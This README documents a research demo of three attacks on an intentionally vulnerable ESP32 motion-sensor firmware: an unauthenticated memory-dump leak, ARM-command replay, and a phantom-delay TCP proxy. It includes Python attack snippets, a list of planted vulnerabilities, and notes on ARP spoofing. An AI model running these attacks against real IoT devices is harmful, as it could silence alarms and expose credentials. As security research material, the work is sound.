# VESPER ESP32 M5Stack Attack Demo

Physical hardware companion to the 30-scene VESPER autonomous evaluation.
The M5Stack runs the same intentionally-vulnerable VESPER motion-sensor firmware as the
Docker/QEMU containers used in the big evaluation, and the attack scripts run
**one representative attack from each of the 3 VESPER attack suites** — Firmware,
Network, and Relay/Phantom-Delay — against it over WiFi.

The attacks are split into **separate standalone modules** under `scripts/attacks/`,
allowing each attack to be studied, modified, and run independently, or executed
together through a single combined runner.

---

## Table of Contents

- [Hardware](#hardware)
- [System Architecture](#system-architecture)
- [Firmware Overview](#firmware-overview-motion_sensor_vulnerableino)
- [Setup](#setup)
- [Project Structure — Attack Modules](#project-structure--attack-modules)
- [Running the Attacks](#running-the-attacks)
- [The 3 Attacks — Full Explanation](#the-3-attacks--full-explanation)
  - [Suite 1 — Firmware Attack](#suite-1--firmware-attack-information-disclosure-debug_dump)
  - [Suite 2 — Network Attack](#suite-2--network-attack-protocol-replay)
  - [Suite 3 — Relay / Phantom-Delay](#suite-3--relay--phantom-delay-attack-fu-et-al-dsn-2022)
- [Live Visualisation Features](#live-visualisation-features)
- [Expected Output](#expected-output-all-3-attacks-succeeding)
- [Connection to the 30-Scene Evaluation](#connection-to-the-30-scene-evaluation)
- [M5Stack LCD Reference](#m5stack-lcd-reference)
- [Troubleshooting](#troubleshooting)
- [Safety Note](#safety-note)

---

## Hardware

| Component | Details |
|-----------|---------|
| Board | M5Stack Basic Development Kit v2.7 |
| SoC | ESP32-D0WDQ6-V3 rev 3.1 (Xtensa dual-core, 240 MHz) |
| IMU | MPU-6886 (accelerometer + gyroscope, used for real motion detection) |
| Display | 320x240 IPS LCD (shows live attack feedback) |
| Transport | WiFi 802.11 b/g/n -> TCP, port **15011** |
| USB | CH9102 USB-serial (macOS: built-in driver) |

---

## System Architecture

```
+----------------------------+   WiFi / TCP :15011   +-----------------------------+
|  Attacker machine          | <-------------------> |  M5Stack (physical ESP32)   |
|  (this MacBook)            |                       |  motion_sensor_vulnerable   |
|                            |                       |  firmware (same protocol as |
|  Attack modules:           |                       |  Docker/QEMU containers)    |
|  scripts/attacks/          |                       |                             |
|  +--------------------+    |                       |                             |
|  | firmware.py        | ---+-- DEBUG_DUMP -------> |  VESPER TCP protocol        |
|  | (Suite 1)          |    |  <- TOKEN/SEED/IP     |  commands: GET_MOTION, ARM, |
|  +--------------------+    |                       |  DISARM, SET_ID, AUTH,      |
|  | network.py         | ---+-- replay ARM 3x ----> |  DEBUG_DUMP, REBOOT         |
|  | (Suite 2)          |    |                       |                             |
|  +--------------------+    |                       |                             |
|  | relay.py           |    |  127.0.0.1:16011      |                             |
|  | (Suite 3)          | ---+--[_DelayProxy]-------> |  Intentional vulnerabilities|
|  +--------------------+    |  (transparent TCP)    |  - strcpy overflow          |
|                            |                       |  - DEBUG_DUMP backdoor      |
|  esp32_attack_demo.py      |                       |  - AUTH always OK           |
|  (combined runner)         |                       |  - no replay protection     |
+----------------------------+                       +-----------------------------+
```

The M5Stack firmware (`motion_sensor_vulnerable.ino`) is deliberately identical in protocol
and vulnerabilities to the ARM QEMU firmware used across the 30-scene evaluation, making
this a **physical validation** of the same attack surface.

---

## Firmware Overview (`motion_sensor_vulnerable.ino`)

### Protocol — VESPER TCP (port 15011)

All communication is newline-delimited ASCII over a persistent TCP connection.
There is **no TLS, no encryption, no HMAC, and no nonce** — every command is
plaintext and can be read, captured, or replayed by any entity on the network.

| Command | Response | Description |
|---------|----------|-------------|
| `IDENTIFY` | `DEVICE:VESPER_ESP32_MOTION\nTYPE:MOTION_SENSOR\nID:<id>` | Device identification |
| `GET_MOTION` | `MOTION:active` or `MOTION:inactive` | Poll current motion state |
| `GET_COUNT` | `COUNT:<n>` | Total detection count |
| `ARM` | `ARMED:yes\nACK` | Arm the sensor |
| `DISARM` | `ARMED:no\nACK` | Disarm the sensor |
| `GET_ARMED` | `ARMED:yes` or `ARMED:no` | Query arm state |
| `ON` / `OFF` | `SWITCH:on\nACK` / `SWITCH:off\nACK` | SmartThings switch aliases |
| `SET_SENSITIVITY:<1-9>` | `SENSITIVITY:<n>\nACK` | Set detection threshold |
| `STATUS` | `STATUS:OK` | Heartbeat |
| `SET_ID:<string>` | `ID:<string>\nACK` **(vulnerable)** | Set device ID — no length check |
| `AUTH:<token>` | `AUTH:OK\nACK` **(vulnerable)** | Authenticate — always OK |
| `DEBUG_DUMP` | memory dump **(vulnerable)** | Debug backdoor, no auth required |
| `REBOOT` | `ACK:REBOOT` then restart | Reboot device |

On connection the device immediately sends:
```
BOOTED
DEVICE:VESPER_ESP32_MOTION
READY
```

### Motion Detection

The MPU-6886 IMU is polled every 50 loop ticks (~1 second).
Motion fires when any axis exceeds the threshold:

```
|accX| > 0.3g  OR  |accY| > 0.3g  OR  |accZ - 1.0g| > 0.3g
```

-> **Shake or tilt the device to trigger a real motion event.**

### Intentional Vulnerabilities (mirroring the QEMU firmware)

```
Global memory layout (simplified):
  char device_id[16]   = "esp32-motion-001"   <- only 16 bytes allocated
  char auth_token[64]  = "SECRET_KEY_9x7z"    <- immediately follows in memory
```

| # | Location | Vulnerability class | CWE |
|---|----------|---------------------|-----|
| V1 | `SET_ID:` handler | Buffer overflow — `strcpy(device_id, cmd+7)` no length check | CWE-120 |
| V2 | `AUTH:` handler | Authentication bypass — always responds `AUTH:OK` | CWE-287 |
| V3 | `DEBUG_DUMP` handler | Information disclosure — leaks token, PRNG seed, WiFi IP, uptime | CWE-200 |
| V4 | All commands | Missing replay protection — no nonce, sequence number, or timestamp | CWE-294 |

---

## Setup

### 1. Arduino IDE

```
Arduino IDE >= 2.x
Board manager URL:  https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json
Board:  ESP32 Arduino -> ESP32 Dev Module          <- IMPORTANT: not "M5Stack-Core-ESP32"
Upload speed:  115200                              <- lower speed needed for stable flashing
Library:  M5Unified  (NOT the old M5Stack library -- incompatible with ESP32 core 3.x)
```

### 2. WiFi credentials

Edit `motion_sensor_vulnerable.ino` lines 22-23:

```cpp
const char* WIFI_SSID     = "YOUR_SSID";
const char* WIFI_PASSWORD = "YOUR_PASSWORD";
```

### 3. Flash

1. Connect M5Stack via USB-C
2. Arduino IDE -> Select port `/dev/cu.usbserial-*`
3. Click **Upload**
4. If it hangs at "Connecting...": hold the left button on the M5Stack while clicking Upload, release when "Uploading..." appears

### 4. Note the IP address

The LCD shows after boot:

```
IP: 192.168.1.XXX   <- note this
Port: 15011
Ready for attacks!
```

### 5. Python environment

```bash
cd /path/to/vesper
conda activate vesper          # or: source .venv/bin/activate
```

No extra Python dependencies are needed — the attack scripts use only the standard
library (`socket`, `threading`, `time`, `argparse`).

---

## Project Structure — Attack Modules

The attacks are organised as a Python package under `scripts/attacks/`:

```
scripts/
├── esp32_attack_demo.py            # Combined runner — imports & calls all 3 attacks
└── attacks/
    ├── __init__.py                 # Package init, re-exports 3 attack functions
    ├── common.py                   # Shared display helpers, TCP utilities, colour codes
    ├── firmware.py                 # Suite 1 — Information Disclosure (standalone)
    ├── network.py                  # Suite 2 — Protocol Replay (standalone)
    └── relay.py                    # Suite 3 — Relay/Phantom-Delay (standalone)
```

| File | Lines | Purpose |
|------|-------|---------|
| `common.py` | ~190 | ANSI colour codes, timestamped packet display (`tx()` / `rx()`), sensitive-field annotations (`annotate()`), state-change banners (`state_box()`), section headers, progress bar, low-level TCP send helper, connection verification |
| `firmware.py` | ~150 | **Suite 1**: Opens TCP socket, sends `DEBUG_DUMP` without any auth, parses leaked TOKEN/SEED/IP/TICKS |
| `network.py` | ~135 | **Suite 2**: Resets device to DISARMED, replays the captured `ARM` command 3x over fresh TCP sessions |
| `relay.py` | ~315 | **Suite 3**: Spawns `_DelayProxy` transparent TCP proxy, connects through it, sends `ARM`, shows live progress bar during the hold, measures observed delay |
| `esp32_attack_demo.py` | ~120 | Thin runner that imports from the package, calls all 3 attacks in sequence, prints summary |

Every attack module is **independently runnable** with its own `main()` and `--target`
CLI flag. This lets you study one attack in isolation without running the others.

---

## Running the Attacks

### Target

The target is the **M5Stack ESP32** running `motion_sensor_vulnerable.ino`, reachable
over WiFi on your local network. The IP address is displayed on the M5Stack LCD after
boot. The firmware listens on **TCP port 15011**.

The attack scripts connect to the ESP32 over a plain TCP socket — no special libraries,
no MQTT broker, no cloud accounts needed. The attacker machine and the M5Stack must be
on the **same WiFi network**.

### Option 1 — Run all 3 attacks together

```bash
cd /path/to/vesper
conda activate vesper

python scripts/esp32_attack_demo.py --target 192.168.1.XXX:15011
```

This runs Suite 1 -> Suite 2 -> Suite 3 in sequence with a 1-second pause between
each, then prints a combined summary. The clock resets before each attack so
timestamps shown are relative to each attack's start.

| Flag | Default | Description |
|------|---------|-------------|
| `--target <IP>:<port>` | required | ESP32 address shown on the LCD |
| `--delay <seconds>` | `5.0` | How long Suite 3 holds state-change responses |
| `--no-verify` | off | Skip the initial TCP connection check |

### Option 2 — Run each attack individually

Each attack has its own CLI entry point, so you can run them independently:

```bash
# Suite 1 only — Firmware Information Disclosure
python scripts/attacks/firmware.py --target 192.168.1.XXX:15011

# Suite 2 only — Network Protocol Replay
python scripts/attacks/network.py  --target 192.168.1.XXX:15011

# Suite 3 only — Relay/Phantom-Delay (with custom delay)
python scripts/attacks/relay.py    --target 192.168.1.XXX:15011 --delay 8
```

| Flag | Applies to | Default | Description |
|------|------------|---------|-------------|
| `--target <IP>:<port>` | All | required | ESP32 address |
| `--delay <seconds>` | Suite 3 only | `5.0` | Phantom-delay hold duration |
| `--no-verify` | All | off | Skip connection check |

---

## The 3 Attacks — Full Explanation

The script runs one representative attack from each VESPER evaluation suite in order.
Each attack targets a different category of vulnerability in the VESPER protocol and
firmware.

---

### Suite 1 — Firmware Attack: Information Disclosure (`DEBUG_DUMP`)

**Source file**: `scripts/attacks/firmware.py`
**Function**: `attack_firmware_info_disclosure(host, port)`
**CVSS**: 7.5 (High)
**CWE**: CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor

#### What this attack does

The firmware exposes a `DEBUG_DUMP` command that was left in the production image.
It is a debug backdoor that requires **no authentication whatsoever** and returns a
complete memory snapshot containing every secret the device holds. When an attacker
sends this single command over a plain TCP connection, the ESP32 responds with:

```
DEBUG:MEMORY_DUMP
SEED:54321
TOKEN:SECRET_KEY_9x7z
TICKS:13686
WIFI_IP:192.168.1.112
```

Every line in that response is a security-critical leak:

| Field | What it is | Why it matters |
|-------|-----------|----------------|
| `SEED:54321` | The firmware's PRNG seed | With this seed, the attacker can compute every future "random" value the device will generate. If the firmware ever adds nonces or session tokens derived from `random()`, they are all predictable. |
| `TOKEN:SECRET_KEY_9x7z` | The authentication token hardcoded in memory | The attacker can impersonate the device to the hub, hijack existing sessions, or forge authenticated commands. |
| `TICKS:13686` | Device uptime in loop ticks | Reveals how long the device has been running, useful for timing attacks and narrowing brute-force windows. |
| `WIFI_IP:192.168.1.112` | The device's internal WiFi IP address | Confirms the device's position on the LAN for lateral movement, ARP spoofing setup, or targeted port scanning. |

#### The attack target

- **Target device**: M5Stack ESP32 running `motion_sensor_vulnerable.ino`
- **Target port**: TCP 15011
- **Target service**: VESPER plaintext command protocol
- **Required credentials**: None — the `DEBUG_DUMP` handler has no access control

#### Attack vector — step by step

```
                                       ESP32 (192.168.1.112:15011)
Attacker                                      |
   |                                           |
   |-- 1. TCP connect (no TLS, no auth) ------>|
   |                                           |
   |<- 2. Banner: BOOTED / DEVICE / READY ----|   (immediate, unauthenticated)
   |                                           |
   |-- 3. Send: DEBUG_DUMP\n ----------------->|   (no AUTH command first)
   |                                           |
   |<- 4. Response:                           -|
   |       DEBUG:MEMORY_DUMP                   |
   |       SEED:54321           < PRNG seed    |
   |       TOKEN:SECRET_KEY_9x7z < auth token  |
   |       TICKS:13686          < uptime       |
   |       WIFI_IP:192.168.1.112 < LAN IP     |
   |                                           |
   |-- 5. Close connection ------------------->|
```

**Step 1** — The attacker opens a raw TCP socket to the ESP32's IP and port 15011.
No TLS handshake, no certificate, no username/password prompt.

**Step 2** — The ESP32 immediately sends its connection banner (`BOOTED`,
`DEVICE:VESPER_ESP32_MOTION`, `READY`). The attacker drains this.

**Step 3** — The attacker sends the ASCII string `DEBUG_DUMP\n`. This is the only
payload — one command, 11 bytes. The firmware's command handler matches this string
and executes the debug dump routine with no access-control check.

**Step 4** — The ESP32 responds with the full memory dump. The attack script
(`firmware.py`) parses each line, identifies `TOKEN:`, `SEED:`, `WIFI_IP:`,
and `TICKS:` fields, and reports them as evidence.

**Step 5** — The connection is closed. The entire attack takes < 500ms.

#### How the code launches this attack

```python
# From scripts/attacks/firmware.py — attack_firmware_info_disclosure()

# Step 1: Open a raw TCP socket — no auth
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(6.0)
sock.connect((host, port))          # e.g. ("192.168.1.112", 15011)

# Step 2: Drain the connection banner
time.sleep(0.15)
banner = sock.recv(1024)            # "BOOTED\nDEVICE:VESPER_ESP32_MOTION\nREADY\n"

# Step 3: Send DEBUG_DUMP — no AUTH command first
sock.sendall(b"DEBUG_DUMP\n")

# Step 4: Collect the response
resp_raw = b""
while time.time() < deadline:
    chunk = sock.recv(4096)
    resp_raw += chunk
    if b"WIFI_IP" in resp_raw or b"TICKS" in resp_raw:
        break
sock.close()

# Step 5: Parse response — extract SEED, TOKEN, WIFI_IP, TICKS
for line in resp.splitlines():
    if line.startswith("TOKEN:"):
        evidence.append(f"Auth token leaked: '{line[6:]}'")
    elif line.startswith("SEED:"):
        evidence.append(f"PRNG seed leaked: {line[5:]}")
    ...
```

#### Why this attack succeeds

The `DEBUG_DUMP` command handler in the firmware has **no access-control check**:
- No authentication state is verified before executing the dump.
- No client certificate, session token, or password is required.
- The handler is present in all firmware variants (ESP32, Docker, QEMU).
- Any TCP client on the same network (or internet, if port 15011 is forwarded)
  can call it.

#### What the attacker gains

- **Auth token** -> impersonate the device to the hub, hijack sessions
- **PRNG seed** -> predict every future random value the device generates
- **WiFi IP** -> map network topology, target for ARP spoofing or lateral movement
- **Uptime** -> timing attacks, narrow brute-force windows

#### M5Stack LCD during this attack

Yellow status bar shows `CMD: DEBUG_DUMP`. No state-change panel appears because
the device's arm state is not modified.

---

### Suite 2 — Network Attack: Protocol Replay

**Source file**: `scripts/attacks/network.py`
**Function**: `attack_network_replay(host, port)`
**CVSS**: 8.1 (High)
**CWE**: CWE-294 — Authentication Bypass by Capture-replay

#### What this attack does

The VESPER protocol has **zero replay protection**: no nonce, no sequence number,
no HMAC, no timestamp, and no session binding. A command captured from the network
is valid **forever** and from **any source IP**. The protocol is plaintext ASCII
over TCP, so any observer on the same WiFi network (or anyone performing ARP spoofing)
can trivially read every command in transit.

This attack simulates an adversary who has captured a single `ARM` command from the
wire — for example by running Wireshark on the same LAN, performing ARP spoofing,
or simply observing unencrypted WiFi frames. The attacker then:

1. Resets the device to a known `DISARMED` state
2. Replays the captured `ARM` command **3 times** over separate TCP connections
3. Every replay is accepted — the device re-arms each time without questioning
   who sent it, when it was originally sent, or how many times it has been used

#### The attack target

- **Target device**: M5Stack ESP32 running `motion_sensor_vulnerable.ino`
- **Target port**: TCP 15011
- **Target service**: VESPER plaintext command protocol
- **Required credentials**: None — the captured command is self-contained
- **Captured command**: `ARM\n` (4 bytes of ASCII — trivially sniffable)

#### Attack vector — step by step

```
                                            ESP32 (192.168.1.112:15011)
Attacker                                           |
   |                                                |
   |  Precondition: attacker sniffed "ARM\n"        |
   |  from the wire (plaintext TCP, no encryption)  |
   |                                                |
   |-- Step 1: DISARM (reset to known state) ------>|
   |<- ARMED:no  ACK ------------------------------|
   |                                                |
   |   +================================+           |
   |   |  Device State: DISARMED        |           |
   |   +================================+           |
   |                                                |
   |-- Step 2, Replay #1: ARM ---------------------->|  (fresh TCP connection)
   |<- ARMED:yes  ACK ------------------------------|  ACCEPTED
   |                                                |
   |   +================================+           |
   |   |  Device State: ARMED           |           |
   |   +================================+           |
   |                                                |
   |-- Step 2, Replay #2: ARM ---------------------->|  (fresh TCP connection)
   |<- ARMED:yes  ACK ------------------------------|  ACCEPTED
   |                                                |
   |-- Step 2, Replay #3: ARM ---------------------->|  (fresh TCP connection)
   |<- ARMED:yes  ACK ------------------------------|  ACCEPTED
   |                                                |
   |-- Step 3: GET_ARMED (confirm) ----------------->|
   |<- ARMED:yes ------------------------------------|
```

**Step 1 — Reset to known state**: The attacker sends `DISARM` and confirms the
device responds `ARMED:no`. This establishes a baseline so the state change caused
by the replay is clearly visible. The attack then sends `GET_ARMED` to verify the
current state and displays a `DISARMED` state box.

**Step 2 — Replay 3 times**: The attacker sends the captured `ARM` command three
times, each over a **fresh TCP connection** (simulating the packet arriving from a
different host). Each replay is independently accepted:
- The firmware receives `ARM\n`, matches it against its command table
- It sets `isArmed = true` and responds `ARMED:yes\nACK`
- No check is made for: (a) whether this is a duplicate, (b) whether the source
  IP matches the original sender, (c) whether the command has expired, or
  (d) whether any cryptographic signature is valid
- After each replay, a state box is printed showing the device is now ARMED

**Step 3 — Confirm final state**: The attacker sends `GET_ARMED` to verify the
device is still armed. The device confirms `ARMED:yes`.

#### How the code launches this attack

```python
# From scripts/attacks/network.py — attack_network_replay()

captured_cmd = "ARM"      # "sniffed from the wire" — plaintext, trivially captured

# Step 1: Reset device to DISARMED
tx("DISARM")
rx(send(host, port, "DISARM"))

# Step 2: Replay 3 times — each on a fresh TCP connection
for i in range(3):
    tx(captured_cmd)
    resp = send(host, port, captured_cmd)    # send() opens a NEW TCP socket each time
    rx(resp)
    if "ARMED:yes" in resp or "ACK" in resp:
        accepted += 1
        state_box("ARMED")                   # shows green ARMED banner
    time.sleep(0.4)

# Step 3: Confirm final state
tx("GET_ARMED")
after = send(host, port, "GET_ARMED")
rx(after)
```

The `send()` helper (from `common.py`) opens a **fresh TCP connection** for each
call, drains the banner, sends the command, and collects the response. This means
each replay arrives from a new TCP session — identical to a replayed packet from
a different machine on the network.

#### Why this attack succeeds

TCP provides delivery ordering and error correction, but **not replay protection
at the application layer**. For a protocol to resist replay, it needs at least one of:

| Defence mechanism | Present in VESPER? |
|-------------------|--------------------|
| Per-message nonce (random challenge-response) | No |
| Sequence numbers (monotonically increasing) | No |
| Timestamp with expiry window | No |
| HMAC / digital signature over message body | No |
| Session-bound tokens (invalidated after use) | No |
| TLS mutual authentication | No |

VESPER has **none of these**. The firmware processes any correctly-formatted command
regardless of when or how many times it arrives. This is identical across the ESP32,
Docker, and QEMU firmware variants in the 30-scene evaluation.

#### What the attacker gains

- Can **re-trigger any previously observed command** indefinitely:
  `ARM`, `DISARM`, `REBOOT`, `SET_ID`, `ON`, `OFF` — all replayable
- Combined with the leaked token from Suite 1, the attacker can replay
  authenticated sessions even if auth is ever added to the transport
- The attacker does not need to be on the network at the time of the original
  command — a single captured packet is sufficient for all future replays

#### M5Stack LCD during this attack

The LCD alternates between the red `DISARMED` panel and the green `ARMED` panel
as the device is first disarmed and then re-armed three times by the replayed
packets. Each state change is visible in real time on the physical hardware.

---

### Suite 3 — Relay / Phantom-Delay Attack (Fu et al. DSN 2022)

**Source file**: `scripts/attacks/relay.py`
**Function**: `attack_relay_phantom_delay(host, port, delay_s=5.0)`
**Reference**: Fu et al., *"IoT Phantom-Delay Attacks: Demystifying and Exploiting IoT Timeout Behaviors"*, IEEE/IFIP DSN 2022
**CVSS**: 9.3 (Critical)
**CWE**: CWE-362 — Concurrent Execution Using Shared Resource with Improper Synchronization (Race Condition)

#### Background

Fu et al. (DSN 2022) demonstrated that IoT platforms (Apple HomeKit, Samsung
SmartThings, Ring Security) decouple TCP-level timeout detection from
application-layer event acknowledgment. An attacker on the same LAN performs ARP
spoofing to route traffic through a transparent TCP proxy, then **selectively delays
state-change messages** by a precise number of seconds. The hub never detects an
outage (keepalives and non-critical messages pass through instantly), but its
world-model becomes **stale** for the delay window — causing automations to fire
at the wrong time or not at all.

VESPER reproduces this attack class in the 30-scene evaluation against Docker
firmware containers. This demo runs the full mechanism against physical ESP32
hardware.

#### What this attack does

The attack script spawns a **transparent TCP proxy** (`_DelayProxy` class) that sits
between the hub/controller and the real ESP32 device. The proxy operates with two
asymmetric forwarding rules:

1. **Commands (hub -> ESP32)**: Forwarded **instantly** — the hub experiences no
   command-send latency, so it has no reason to suspect anything abnormal.

2. **State-change responses (ESP32 -> hub)**: Inspected by the proxy. If the response
   contains any of the keywords `ARMED:`, `SWITCH:`, `EVENT:MOTION`, `OVERFLOW:`,
   or `MOTION:`, the proxy **holds the message** for a configurable delay
   (default 5 seconds) before forwarding it to the hub.

The result: the ESP32 processes the command and changes state immediately, but the
hub does not learn about the state change until the delay expires. During that window,
the hub's world-model is **incorrect** — it reads the old state. Any automation rule
that queries device state during the delay window will make the wrong decision.

```
Normal flow (no attack):
  Hub -- ARM -------------------------------------------> ESP32
  Hub <- ARMED:yes  ACK --------------------------------- ESP32     (latency ~5ms)
  Hub world-model: ARMED  (correct immediately)

Attack flow (proxy interposed):
  Hub -- ARM -----------> Proxy ----------------> ESP32     (command: instant)
                          Proxy <---------------- ESP32     (ARMED:yes received by proxy)
  Hub    [world-model: DISARMED — STALE for 5 seconds]
  Hub <- ARMED:yes ------ Proxy                             (delivered after 5.0s hold)
  Hub world-model: ARMED  (correct, but 5 seconds late)
```

#### The attack target

- **Target device**: M5Stack ESP32 running `motion_sensor_vulnerable.ino`
- **Target port**: TCP 15011 (real device), TCP 16011 (local proxy)
- **Target service**: VESPER plaintext command protocol
- **Proxy location**: `127.0.0.1:16011` -> `192.168.1.XXX:15011`
- **Required credentials**: None — the proxy is transparent
- **Required network position**: Same LAN as the ESP32 (in production: via ARP spoofing)

#### Attack vector — step by step

```
Step 1   Attacker starts _DelayProxy on 127.0.0.1:16011
         Proxy connects upstream to the real ESP32 at 192.168.1.XXX:15011
         In a real attack: ARP-spoof the hub to redirect ESP32 traffic

Step 2   Hub/controller connects to the PROXY (127.0.0.1:16011)
         Proxy opens a second TCP connection to the real ESP32
         Hub receives the normal banner (BOOTED/DEVICE/READY) — passed through instantly
         Hub cannot tell a proxy is present

Step 3   Hub sends ARM through the proxy
         Proxy forwards ARM to ESP32 immediately (hub->device direction: no delay)
         ESP32 processes ARM, sets isArmed=true, responds ARMED:yes

Step 4   Proxy inspects the response: "ARMED:" matches DELAY_KEYWORDS
         Proxy holds ARMED:yes for 5.0 seconds (time.sleep(delay_s))
         During this hold:
           - ESP32 is actually ARMED (green panel on LCD)
           - Hub still thinks device is DISARMED (stale world-model)
           - Live progress bar shows elapsed time vs delay duration
           - Any automation rule checking "is armed?" returns WRONG answer

Step 5   After 5.0s, proxy releases ARMED:yes to the hub
         Hub finally learns device is ARMED — 5 seconds late
         The stale-state window is exactly delay_s seconds

Step 6   Attack script reports: observed_delay ~ 5.0s, success=True
```

#### Proxy internals (`_DelayProxy` class in `relay.py`)

The proxy is implemented as a Python `threading.Thread` subclass:

```python
class _DelayProxy(threading.Thread):
    """
    Transparent TCP proxy that selectively delays ESP32 -> hub messages.
    """
    # Keywords that trigger the delay hold:
    DELAY_KEYWORDS = [b"ARMED:", b"SWITCH:", b"EVENT:MOTION", b"OVERFLOW:", b"MOTION:"]

    def run(self):
        # Bind 127.0.0.1:16011, accept incoming connections
        # For each client: spawn _pipe() in a new thread

    def _pipe(self, client):
        # Open second TCP socket to real ESP32 (upstream)
        # Start two sub-threads:
        #
        #   Thread A — hub_to_esp (instant):
        #     data = client.recv(4096)  ->  esp.sendall(data)
        #     Commands pass through with zero delay.
        #
        #   Thread B — esp_to_hub (selective delay):
        #     data = esp.recv(4096)
        #     if any keyword in data:
        #         time.sleep(delay_s)       <- THE HOLD
        #     client.sendall(data)

    def stop(self):
        # Signal all threads to exit, close listener socket
```

**Messages that pass through instantly** (not delayed):
- Connection banner (`BOOTED`, `DEVICE:VESPER_ESP32_MOTION`, `READY`)
- `STATUS:OK`, `COUNT:`, `SENSITIVITY:`, `ID:`, `AUTH:OK`
- `ERROR:` messages
- All **hub -> device** direction commands (always instant)

**Messages that are held for `delay_s` seconds**:
- `ARMED:yes` / `ARMED:no` — arm state changes
- `SWITCH:on` / `SWITCH:off` — switch state changes
- `EVENT:MOTION:active` — motion alert events
- `OVERFLOW:DETECTED` — buffer overflow events
- `MOTION:active` / `MOTION:inactive` — motion status responses

#### How the code launches this attack

```python
# From scripts/attacks/relay.py — attack_relay_phantom_delay()

# Step 1: Start the proxy in a background daemon thread
proxy = _DelayProxy(listen_port=16011, target_host=host,
                    target_port=port, delay_s=5.0)
proxy.start()
time.sleep(0.3)        # let proxy bind and listen

# Step 2: Connect the attacker's client to the PROXY, not the real device
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 16011))
banner = sock.recv(1024)     # banner passes through instantly

# Step 3: Send ARM through the proxy
t_send = time.time()
sock.sendall(b"ARM\n")

# Background thread collects the (delayed) response
recv_done = threading.Event()
def _recv_thread():
    resp = sock.recv(4096)    # blocks until proxy releases ARMED:yes
    recv_done.set()

# Step 4: Live progress bar during the delay hold
while not recv_done.is_set():
    elapsed = time.time() - bar_start
    bar = progress_bar(elapsed, delay_s)
    print(f"\r  {bar}  hub sees: DISARMED", end="", flush=True)
    time.sleep(0.1)

# Step 5: Measure observed delay
observed_delay = time.time() - t_send    # should be ~ 5.0s
success = observed_delay >= delay_s * 0.7

# Step 6: Clean up
proxy.stop()
```

#### Why this attack succeeds

The VESPER TCP protocol has no end-to-end message integrity or delivery
acknowledgment at the application layer. The proxy can hold any message
for an arbitrary duration while passing keepalives (`STATUS:OK`) through,
and the hub has no way to detect the stale state. To defend against this attack,
the protocol would need at least one of:

| Defence mechanism | Present in VESPER? |
|-------------------|--------------------|
| Application-layer heartbeat with sequence numbers | No |
| TLS mutual authentication with certificate pinning | No |
| End-to-end message signing (HMAC/signature per message) | No |
| Timestamp + max-age on every response | No |
| Hardware security module (HSM) attestation | No |

Without these, the proxy is invisible to both the hub and the device.

#### Real-world impact

| Scenario | Effect of a 5-second phantom delay |
|----------|-------------------------------------|
| Motion sensor fires while system is armed | Alert arrives 5s after intruder entered — they escape before alarm triggers |
| Automation: "if door opens AND armed -> alert" | Rule evaluates at T+0 (sees DISARMED), skips alert entirely |
| Ring-style grace-period countdown | Timer expires before state update -> false disarm |
| Geofence-triggered arm on departure | Phone confirms departure, hub still shows DISARMED for 5s |
| Smoke alarm interlock | Fire event delayed 5s -> delayed evacuation trigger |
| Smart lock auto-lock on arm | Lock command fires 5s late -> door unlocked during transition |

With a larger delay (e.g. `--delay 30`), the window grows proportionally.
The maximum practical delay is bounded only by TCP keepalive timeouts (typically
minutes to hours).

#### M5Stack LCD during this attack

The M5Stack processes and responds to `ARM` **immediately** — the green `ARMED`
panel appears on the LCD within milliseconds of receiving the command. The device
has no knowledge of the proxy. From the **hub's perspective**, however, the
confirmation arrives 5 seconds later — demonstrating exactly the decoupling
between physical state and reported state described in the DSN 2022 paper.

---

## Live Visualisation Features

All three attack modules share a common set of display helpers (from `common.py`)
that provide real-time wire-level visibility into what is happening during each attack:

| Feature | Description |
|---------|-------------|
| **Relative timestamps** `[+ 2.341s]` | Every packet sent or received is timestamped relative to the start of the current attack, so you can see exact timing |
| **Wire-level send display** `-> HUB: ARM` | Shows every command the attacker sends, including the routing path (direct or via proxy) |
| **Wire-level receive display** `<- ESP32: ARMED:yes` | Shows every response line received, with automatic annotation of sensitive fields |
| **Sensitive-field annotations** `< AUTH TOKEN LEAKED` | Colour-coded side notes flag security-critical data: leaked tokens (red), PRNG seeds (red), internal IPs (yellow), arm state changes (green/red) |
| **State-change banners** `ARMED / DISARMED` | Framed boxes show the device's current arm state after each state transition, making it easy to see when the device arms/disarms |
| **Progress bar** `[========....] 3.2s / 5s (64%)` | During Suite 3's phantom-delay hold, a live-updating progress bar shows elapsed time, with a note that the hub's world-model is stale |
| **Section headers** | Framed headers separate each attack with the attack name, target, and CVE/CVSS info |
| **Step dividers** | Light dividers break each attack into numbered steps for easy following |

---

## Expected Output (all 3 attacks succeeding)

```
======================================================================
  VESPER ESP32 Attack Demo — 3 Attack Suites
  Mirrors the Firmware / Network / Relay suites from the main eval
======================================================================

Target: 192.168.1.112:15011

Verifying connection to 192.168.1.112:15011 ...
  ESP32 connected and responding

Device banner:
BOOTED
DEVICE:VESPER_ESP32_MOTION
READY

Running 3 demo attacks — one per suite ...

  +----------------------------------------------------------------+
  |  Suite 1 — FIRMWARE ATTACK: Information Disclosure              |
  |  Target: 192.168.1.112:15011  |  CWE-200 / CVSS 7.5           |
  +----------------------------------------------------------------+

  -- Step 1 — Open unauthenticated TCP connection --------------------
  [+ 0.001s] connecting to 192.168.1.112:15011 ...
  [+ 0.162s] <- ESP32 (banner):  BOOTED
                                 DEVICE:VESPER_ESP32_MOTION
                                 READY

  -- Step 2 — Send DEBUG_DUMP  (no AUTH command first) ---------------
  [+ 0.163s] -> HUB:    DEBUG_DUMP

  -- Step 3 — Response received  (89 bytes) --------------------------
  [+ 0.340s] <- ESP32:  DEBUG:MEMORY_DUMP    < DUMP START — no auth required!
                         SEED:54321           < PRNG SEED LEAKED
                         TOKEN:SECRET_KEY_9x7z < AUTH TOKEN LEAKED
                         TICKS:13686          < uptime exposed
                         WIFI_IP:192.168.1.112 < internal IP leaked

[1/3] Result — Information Disclosure (DEBUG_DUMP backdoor)
  Severity: HIGH  (CVSS 7.5)
  Status:   SUCCESS
  Evidence:
    1. DEBUG_DUMP accessible without authentication
    2. Auth token leaked: 'SECRET_KEY_9x7z'
    3. PRNG seed leaked: 54321  (enables state prediction)
    4. Internal IP disclosed: 192.168.1.112
    5. Device uptime exposed: 13686 ticks
  Impact:   Auth token theft + PRNG seed enables session prediction and replay
  Duration: 415ms

  +----------------------------------------------------------------+
